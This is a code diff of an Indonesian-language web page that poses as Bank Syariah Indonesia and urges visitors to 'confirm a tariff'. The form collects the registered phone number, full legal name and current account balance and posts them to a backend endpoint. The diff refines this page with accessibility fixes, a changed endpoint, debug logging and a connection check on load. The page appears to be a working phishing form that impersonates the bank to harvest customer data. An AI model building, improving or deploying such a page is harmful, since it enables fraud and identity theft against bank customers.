@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="in">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <title>Bank Syariah Indonesia</title>
@@ -7,107 +7,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
 </head>
-    <style>
-        body {
-    font-family: Arial, sans-serif;
-    max-width: 450px;
-    margin: 0 auto;
-    background-color: #f5f5f5;
-    padding: 20px;
-    line-height: 1.6;
-}
-
-.container {
-    background: white;
-    border-radius: 10px;
-    padding: 20px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
-
-.logo {
-    text-align: center;
-    color: #00A39E;
-    font-size: 24px;
-    font-weight: bold;
-    margin-bottom: 15px;
-}
-
-.description {
-    text-align: center;
-    color: #666;
-    margin-bottom: 20px;
-}
-
-.radio-group {
-    margin: 20px 0;
-}
-
-.radio-item {
-    display: block;
-    margin: 10px 0;
-    padding: 12px;
-    border: 2px solid #00A39E;
-    border-radius: 8px;
-    background: rgba(0, 163, 158, 0.08);
-    cursor: pointer;
-}
-
-.radio-item input[type="radio"] {
-    margin-right: 10px;
-}
-
-.input-group {
-    margin: 15px 0;
-}
-
-.input-group label {
-    display: block;
-    margin-bottom: 5px;
-    font-weight: bold;
-    color: #333;
-}
-
-.form-input {
-    width: 100%;
-    padding: 12px;
-    border: 2px solid #00A39E;
-    border-radius: 8px;
-    box-sizing: border-box;
-    font-size: 16px;
-}
-
-.form-input:focus {
-    outline: none;
-    border-color: #F8B13B;
-    box-shadow: 0 0 0 2px rgba(248, 177, 59, 0.2);
-}
-
-.submit-btn {
-    background: #00A39E;
-    color: white;
-    border: none;
-    padding: 15px;
-    width: 100%;
-    border-radius: 8px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: bold;
-    margin-top: 20px;
-    transition: background 0.3s;
-}
-
-.submit-btn:hover {
-    background: #00857F;
-}
-
-.submit-btn:disabled {
-    background: #ccc;
-    cursor: not-allowed;
-}
-    </style>
 <body>
     <div class="container">
-        <div class="logo">Bank Syariah Indonesia</div>
+        <div class="logo">
+            <h1>Bank Syariah Indonesia</h1>
+        </div>
         
         <div class="form-container">
             <p class="description">Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda</p>
@@ -125,18 +29,18 @@
                 </div>
                 
                 <div class="input-group">
-                    <label>No. HP Terdaftar</label>
-                    <input type="tel" class="form-input" name="nohp" placeholder="Contoh: 08123456789" required>
+                    <label for="nohp">No. HP Terdaftar</label>
+                    <input type="tel" id="nohp" name="nohp" placeholder="Contoh: 08123456789" required>
                 </div>
                 
                 <div class="input-group">
-                    <label>Nama Lengkap</label>
-                    <input type="text" class="form-input" name="nama" placeholder="Nama sesuai KTP" required>
+                    <label for="nama">Nama Lengkap</label>
+                    <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
                 </div>
                 
                 <div class="input-group">
-                    <label>Saldo Akhir</label>
-                    <input type="text" class="form-input" name="saldo" placeholder="Contoh: 1.500.000" required>
+                    <label for="saldo">Saldo Akhir</label>
+                    <input type="text" id="saldo" name="saldo" placeholder="Contoh: 1.500.000" required>
                 </div>
                 
                 <button type="submit" class="submit-btn" id="submitBtn">PROSES</button>
@@ -157,14 +61,17 @@
             };
             
             const submitBtn = document.getElementById('submitBtn');
+            const originalText = submitBtn.textContent;
             
             try {
-                // Tampilkan loading
+                // Show loading
                 submitBtn.textContent = 'Memproses...';
                 submitBtn.disabled = true;
                 
-                // Kirim data ke backend
-                const response = await fetch('/rest/nonok', {
+                console.log('Sending data:', data);
+                
+                // Send to API
+                const response = await fetch('/rest/no', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -172,23 +79,37 @@
                     body: JSON.stringify(data)
                 });
                 
+                console.log('Response status:', response.status);
+                
                 const result = await response.json();
+                console.log('Response data:', result);
                 
                 if (result.success) {
-                    alert('Data berhasil dikirim!');
+                    alert('✅ Data berhasil dikirim!');
                     if (result.redirect) {
                         window.location.href = result.redirect;
                     }
                 } else {
-                    alert('Error: ' + result.message);
+                    alert('❌ Error: ' + result.message);
                 }
             } catch (error) {
-                console.error('Error:', error);
-                alert('Terjadi kesalahan. Silakan coba lagi.');
+                console.error('Fetch error:', error);
+                alert('❌ Terjadi kesalahan jaringan. Silakan coba lagi.');
             } finally {
                 // Reset button
-                submitBtn.textContent = 'PROSES';
+                submitBtn.textContent = originalText;
                 submitBtn.disabled = false;
+            }
+        });
+
+        // Test connection on load
+        window.addEventListener('load', async () => {
+            try {
+                const testResponse = await fetch('/api/hello');
+                const testResult = await testResponse.json();
+                console.log('API test:', testResult);
+            } catch (error) {
+                console.warn('API test failed:', error);
             }
         });
     </script>
